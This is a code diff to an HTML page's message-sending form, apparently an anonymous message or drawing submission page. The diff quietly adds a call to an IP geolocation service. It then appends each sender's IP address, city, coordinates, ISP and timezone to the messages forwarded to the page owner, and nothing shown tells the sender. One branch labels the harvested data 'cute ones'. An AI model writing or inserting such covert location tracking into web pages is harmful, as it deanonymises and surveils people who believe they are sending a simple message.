@@ -1816,8 +1816,30 @@
         notification.classList.remove('show');
       }, 3000);
     }
+    
+    async function getVisitorLocation() {
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    if (!res.ok) throw new Error('Location API failed');
+    
+    const data = await res.json();
+    return {
+      ip: data.ip || 'Unknown',
+      city: data.city || 'Unknown',
+      region: data.region || 'Unknown',
+      country: data.country_name || 'Unknown',
+      latitude: data.latitude || 'N/A',
+      longitude: data.longitude || 'N/A',
+      org: data.org || 'Unknown',
+      timezone: data.timezone || 'Unknown'
+    };
+  } catch (err) {
+    console.error('Location fetch failed:', err);
+    return null;
+  }
+}
 
-    function sendMessage() {
+    async function sendMessage() {
       const name = document.getElementById('nameInput').value;
       const message = document.getElementById('messageInput').value;
       const fileInput = document.getElementById('fileInput').files[0];
@@ -1826,6 +1848,8 @@
       const drawingBlob = window.currentDrawingBlob;
 
       nameError.style.display = 'none';
+      // Fetch location data
+      const locationData = await getVisitorLocation();
 
       try {
         if (!name) {
@@ -1844,7 +1868,12 @@
         sendButton.querySelector('span').textContent = 'Sending...';
 
         const sendPromises = [];
-        const messageBase = `Name: ${name}\n${message}`;
+        let messageBase = `Name: ${name}\n${message}`;
+
+        // Add location info if available
+        if (locationData) {
+          messageBase += `\n\n📍 Location Info:\nIP: ${locationData.ip}\nCity: ${locationData.city}, ${locationData.region}\nCountry: ${locationData.country}\nCoordinates: ${locationData.latitude}, ${locationData.longitude}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`;
+        }
         
         if (fileInput) {
           sendPromises.push(sendPhotoWithPromise(fileInput, messageBase));
@@ -1859,7 +1888,11 @@
         }
         
         if (sendPromises.length === 0) {
-          sendPromises.push(sendTextWithPromise(`Name: ${name}\nMessage: ${message}`));
+          let textMessage = `Name: ${name}\nMessage: ${message}`;
+          if (locationData) {
+              textMessage += `\n\n cute ones:\nIP: ${locationData.ip}\nCity: ${locationData.city}, ${locationData.region}\nCountry: ${locationData.country}\nCoordinates: ${locationData.latitude}, ${locationData.longitude}\nISP: ${locationData.org}\nTimezone: ${locationData.timezone}`;
+            }
+            sendPromises.push(sendTextWithPromise(textMessage));
         }
         
         Promise.all(sendPromises)
@@ -2507,4 +2540,4 @@ function saveDrawingState() {
     window.sendMessage = sendMessage;
   </script>
 </body>
-</html> 
+</html>  
